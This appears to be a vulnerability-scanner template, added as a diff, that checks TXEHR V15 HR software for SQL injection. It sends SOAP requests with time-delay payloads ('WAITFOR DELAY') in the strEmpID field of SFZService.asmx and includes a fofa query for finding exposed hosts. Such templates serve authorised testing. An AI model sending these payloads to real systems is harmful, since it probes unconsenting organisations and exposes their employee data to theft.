@@ -1,0 +1,53 @@
+id: tongxiangHR-TXEHR-V15-SFZService_asmx-sql
+
+info:
+  name: 同享人力资源管理系统-TXEHR V15 SFZService.asmx SQL注入
+  author: HuanXiong
+  severity: high
+  description: |-
+    fofa: body="/Assistant/Default.aspx"
+
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /Service/SFZService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetJianLiByEmpID"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+         <soap:Body>
+          <GetJianLiByEmpID xmlns="http://tempuri.org/">
+           <strEmpID>1';WAITFOR DELAY '0:0:4'--</strEmpID>
+          </GetJianLiByEmpID>
+         </soap:Body>
+        </soap:Envelope>
+      - |
+        POST /Service/SFZService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        SOAPAction: "http://tempuri.org/GetJianLiByEmpID"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+         <soap:Body>
+          <GetJianLiByEmpID xmlns="http://tempuri.org/">
+           <strEmpID>1';WAITFOR DELAY '0:0:8'--</strEmpID>
+          </GetJianLiByEmpID>
+         </soap:Body>
+        </soap:Envelope>
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'duration_1>=4 && duration_1<=5'  
+          - 'duration_2>=8 && duration_2<=9'
+        condition: and
+
+
+
+
+
